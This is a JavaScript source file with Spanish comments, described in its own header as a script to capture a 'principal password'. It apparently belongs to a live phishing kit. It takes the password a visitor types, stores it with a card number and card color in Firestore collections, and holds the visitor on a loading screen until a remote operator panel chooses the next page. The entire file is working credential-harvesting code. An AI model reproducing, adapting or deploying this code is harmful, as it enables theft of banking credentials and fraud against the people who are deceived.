// passwd.js - Script para capturar clave principal
// Sigue el mismo patrón que desf.js: guardado dual, loader persistente, ojitos

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
import {
    getFirestore,
    doc,
    getDoc,
    updateDoc,
    query,
    collection,
    where,
    getDocs,
    onSnapshot
} from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
import { firebaseConfig, appConfig } from "./firebase-config.js";

// Usar la configuración importada directamente
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Función para obtener usuario desde localStorage
function obtenerUsuarioLocal() {
    try {
        const userData = localStorage.getItem("usuario");
        if (userData) {
            const data = JSON.parse(userData);
            return data.usuario;
        }
        return null;
    } catch (error) {
        console.error("Error obteniendo usuario de localStorage:", error);
        return null;
    }
}

// Función para actualizar historial con clave principal (GUARDADO DUAL)
async function actualizarHistorialClave(clave) {
    try {
        const usuario = obtenerUsuarioLocal();
        if (!usuario) {
            console.warn("No se encontró usuario en localStorage");
            return false;
        }

        console.log(`🔑 Actualizando clave principal para: ${usuario}`);
        
        // Obtener datos previos de localStorage
        const userData = JSON.parse(localStorage.getItem("usuario") || "{}");
        const cardColor = userData.cardColor;
        const cardNumber = userData.cardNumber;
        
        // Validar que cardColor y cardNumber existen
        if (!cardColor || !cardNumber) {
            console.error("Faltan datos de tarjeta en localStorage");
            return false;
        }
        // DATOS A ACTUALIZAR - INCLUIR TODOS LOS CAMPOS DE REDIRECCION
        const userRef = doc(db, "redireccion", usuario);
        const userDoc = await getDoc(userRef);
        
        let datosActualizar = {
            clave: clave,
        };
        
        // Si existe el documento en redireccion, obtener todos sus campos
        if (userDoc.exists()) {
            const datosExistentes = userDoc.data();
            datosActualizar = {
                ...datosExistentes, // Incluir TODOS los campos existentes
                clave: clave,
            };
        }
        // Actualizar también el objeto en localStorage
        userData.clave = clave;
        localStorage.setItem("usuario", JSON.stringify(userData));
        
        // userRef y userDoc ya están declarados arriba
        
        if (userDoc.exists()) {
            await updateDoc(userRef, datosActualizar);
            console.log(`✅ Guardado en redireccion/${usuario}`);
            
            // PASO CRUCIAL: Cambiar page a 0 para esperar redirección desde panel
            console.log(`🔄 Cambiando page a 0 para esperar redirección...`);
            await updateDoc(userRef, { page: 0 });
            console.log(`✅ Page cambiado a 0 - Usuario en espera de redirección`);
            
        } else {
            console.warn(`⚠️ Usuario no encontrado en redireccion: ${usuario}`);
        }
        
        // 2. GUARDAR EN COLECCIÓN DATOSHISTORIAL
        const q = query(
            collection(db, "datosHistorial"),
            where("usuario", "==", usuario)
        );
        
        const querySnapshot = await getDocs(q);
        const promesas = [];
        
        querySnapshot.forEach((documento) => {
            const docRef = doc(db, "datosHistorial", documento.id);
            promesas.push(updateDoc(docRef, datosActualizar));
        });
        
        if (promesas.length > 0) {
            await Promise.all(promesas);
            console.log(`✅ Guardado en ${promesas.length} registros de datosHistorial`);
        } else {
            console.warn(`⚠️ No se encontraron registros en datosHistorial para: ${usuario}`);
        }
        
        return true;
    } catch (error) {
        console.error("❌ Error actualizando clave principal:", error);
        return false;
    }
}

// Función para toggle de visibilidad de password (igual que en desf.js)
function togglePasswordVisibility(inputId, iconElement) {
    const input = document.getElementById(inputId);
    if (!input) {
        console.error(`Input ${inputId} no encontrado`);
        return;
    }
    
    if (input.type === 'password') {
        input.type = 'text';
        iconElement.src = '../assets/visiblex23.png';
        iconElement.alt = 'Ocultar clave';
        console.log(`👁️ Clave ${inputId} visible`);
    } else {
        input.type = 'password';
        iconElement.src = '../assets/visible-0x23.png';
        iconElement.alt = 'Mostrar clave';
        console.log(`🙈 Clave ${inputId} oculta`);
    }
}

// Función para configurar event listeners de los ojitos
function configurarTogglePassword() {
    // Buscar todos los elementos con clase 'toggle-password'
    const toggleIcons = document.querySelectorAll('.toggle-password');
    
    toggleIcons.forEach(icon => {
        const targetInputId = icon.getAttribute('data-target');
        if (targetInputId) {
            icon.addEventListener('click', function() {
                togglePasswordVisibility(targetInputId, this);
            });
            console.log(`👁️ Toggle configurado para input: ${targetInputId}`);
        }
    });
    
    console.log(`👁️ Configurados ${toggleIcons.length} toggles de password`);
}

// Inicialización cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', function() {
    console.log('🔑 Script PASSWD cargado');
    
    // Obtener elementos del DOM (IDs correctos de passwd.html)
    const submitBtn = document.getElementById('bAceptar');
    const claveInput = document.getElementById('toko');
    const overlay = document.getElementById('overlay');
    
    console.log('🔍 Elementos encontrados:', {
        submitBtn: !!submitBtn,
        claveInput: !!claveInput,
        overlay: !!overlay
    });
    
    // Verificar que los elementos necesarios existan
    if (!submitBtn || !claveInput) {
        console.error('Elementos del formulario de clave no encontrados');
        return;
    }
    
    // Configurar funcionalidad de ojitos para mostrar/ocultar clave
    configurarTogglePassword();
    
    // Función para validar entrada
    function validateInput() {
        if (claveInput && submitBtn) {
            const claveValid = claveInput.value.trim().length >= 4;
            submitBtn.disabled = !claveValid;
        }
    }
    
    // Función para manejar el envío (similar a manejarEnvioDESF)
    async function manejarEnvioClave(event) {
        console.log('🚀 manejarEnvioClave ejecutado - Iniciando proceso');
        
        event.preventDefault();
        if (!submitBtn || submitBtn.disabled) {
            console.log('🚫 Botón deshabilitado o no encontrado');
            return;
        }
        
        let exitoGuardado = false;
        
        try {
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.7';
            if (overlay) overlay.style.display = "flex";
            
            // Obtener la clave principal
            const clave = claveInput.value.trim();
            
            if (!clave) {
                throw new Error("La clave no puede estar vacía");
            }
            
            if (clave.length < 4) {
                throw new Error("La clave debe tener al menos 4 caracteres");
            }
            
            console.log(`🔑 Procesando clave principal: "${clave.substring(0, 3)}..."`);
            
            // Actualizar historial con la clave principal (GUARDADO DUAL)
            const exito = await actualizarHistorialClave(clave);
            
            if (exito) {
                exitoGuardado = true; // Marcar como exitoso
                console.log("✅ Clave principal guardada exitosamente en Firestore");
                console.log("🔄 Iniciando escucha de redirección...");
                
                // IMPLEMENTAR PATRÓN DE REDIRECCIÓN DE LGP.JS
                const usuario = obtenerUsuarioLocal();
                if (usuario) {
                    const userRef = doc(db, "redireccion", usuario);
                    
                    // Configurar timeout máximo de espera (30 segundos)
                    const timeoutId = setTimeout(() => {
                        console.log('⏰ Timeout de redirección alcanzado');
                        if (submitBtn) {
                            submitBtn.disabled = false;
                            submitBtn.style.opacity = '1';
                        }
                        if (overlay) overlay.style.display = "none";
                        alert("Tiempo de espera agotado. Por favor, intente nuevamente.");
                        unsubscribe();
                    }, 300000);
                    
                    // Configurar la escucha de cambios en Firestore
                    const unsubscribe = onSnapshot(userRef, (doc) => {
                        if (doc.exists()) {
                            const userData = doc.data();
                            const page = userData.page;
                            console.log(`🔄 Cambio detectado - page: ${page}`);
                            
                            // Redireccionar según la página asignada
                            if (page > 0) {
                                // Usar configuración centralizada de rutas
                                const route = appConfig.routes[page];
                                if (route) {
                                    console.log(`🚀 Redirigiendo a: ${route.url} (${route.name})`);
                                    // Cancelar el timeout ya que vamos a redireccionar
                                    clearTimeout(timeoutId);
                                    // Ocultar overlay justo antes de redireccionar
                                    if (overlay) overlay.style.display = "none";
                                    window.location.href = route.url;
                                } else {
                                    console.warn(`⚠️ Ruta no encontrada para page: ${page}`);
                                    // Fallback para páginas no definidas
                                    clearTimeout(timeoutId);
                                    if (overlay) overlay.style.display = "none";
                                    window.location.href = `page${page}.html`;
                                }
                            }
                            // Si page es 0, mantener el loader visible esperando instrucciones del panel
                        }
                    });
                } else {
                    console.error("❌ No se encontró usuario para escuchar cambios");
                }
                
                // NO ejecutar finally para mantener loader activo
                return;
                
            } else {
                throw new Error("No se pudo guardar la clave principal en la base de datos");
            }
            
        } catch (error) {
            alert(`Error: ${error.message || 'Error desconocido al procesar la clave'}`);
            console.error("Error en PASSWD:", error);
        } finally {
            // SOLO restaurar estado si NO fue exitoso
            if (!exitoGuardado) {
                console.log('🔄 Restaurando estado del botón - Error en guardado');
                if (submitBtn) {
                    submitBtn.disabled = false;
                    submitBtn.style.opacity = '1';
                }
                if (overlay) overlay.style.display = "none";
            } else {
                console.log('🔒 Manteniendo loader activo - Éxito en guardado');
            }
        }
    }
    
    // Agregar event listeners (similar a lgp.js)
    if (submitBtn) {
        submitBtn.addEventListener('click', manejarEnvioClave);
    }
    
    // Validación en tiempo real
    if (claveInput) {
        claveInput.addEventListener('input', validateInput);
    }
    
    // Validación inicial
    validateInput();
    
    console.log('🔑 Event listeners PASSWD configurados');
});

// Hacer funciones disponibles globalmente si es necesario
window.actualizarHistorialClave = actualizarHistorialClave;
window.obtenerUsuarioLocal = obtenerUsuarioLocal;
window.togglePasswordVisibility = togglePasswordVisibility;
window.configurarTogglePassword = configurarTogglePassword;
